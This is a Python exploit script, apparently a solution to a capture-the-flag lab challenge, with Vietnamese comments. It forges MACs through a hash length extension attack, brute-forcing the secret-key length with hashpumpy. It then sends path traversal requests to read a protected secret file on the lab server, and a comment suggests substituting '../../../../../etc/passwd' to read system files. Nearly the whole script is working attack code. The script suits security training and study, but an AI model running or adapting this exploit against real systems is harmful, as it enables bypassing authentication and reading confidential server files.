# -*- coding: utf-8 -*-

import base64
from urllib.parse import quote
import requests
import re 
import hashpumpy

session = requests.session()
regex = "[%0-9A-Z]"

def HashLenghExtensiontAttack(Input_Signature, Input_Data, Input_Data_To_Add):
    dict_hash_length_attack = {}
    for length_of_secretKey in range(1, 32): # Brute-force chiều dài của secretKey
        
        GEN_HASH = hashpumpy.hashpump(Input_Signature, Input_Data,Input_Data_To_Add, length_of_secretKey) # Đoạn này là để tạo ra một payload mới đã được padding và sinh giá trị MAC

        mac = GEN_HASH[0] # Giá trị MAC mới
        payload = quote(GEN_HASH[1]) # Giá trị payload sau khi được padding  

        payload = ''.join(re.findall(regex, payload))
        dict_hash_length_attack[payload] = mac
    return dict_hash_length_attack
    

def getFlag(URL, dict_to_brute, Input_File_In_Server, Flag_File):
    length_secret_key = 0 
    for payload in dict_to_brute:
        length_secret_key += 1
        mac = dict_to_brute[payload]
        FULL_URL = f"{URL}?file=name{Input_File_In_Server}{payload}&filename={Flag_File}&mac={mac}"

        HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-GB,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1", "Cache-Control": "max-age=0"}
        
        res = session.get(FULL_URL, headers=HEADERS).text 
        if "403 Forbidden!" in res:
            print("[-] FAILED")
        else:
            print("[+] FOUND LENGTH SECRET KEY: " + str(length_secret_key))
            print("[+] FOUND PAYLOAD: " + payload)
            print("[+] FOUND MAC VALID: " + mac)
            
            print(FULL_URL)
            break
        print(res)

if __name__ == "__main__":
    URL = "https://spotthebug3.cyberjutsu-lab.tech/access.php"
    
    Input_Signature = "937260e62ef8733819ad4cd9c1342a02" # Giá trị MAC ban đầu
    Input_File_In_Server = "hinh-con-cho.jpg" # File ban đầu mà ta có thể đọc được
    Input_Data = f"filename{Input_File_In_Server}" 
    Flag_File = "../bí_mật_đừng_để_bị_mất.txt" # File mà chúng ta muốn đọc trên server. Đoạn này ta có thể thay thành ../../../../../etc/passwd để khai thác lỗi Path Traversal trên server 
    Append_Data = f"filename{Flag_File}" 
    
    dict_to_brute = HashLenghExtensiontAttack(Input_Signature, Input_Data, Append_Data)
    getFlag(URL, dict_to_brute, Input_File_In_Server, Flag_File)
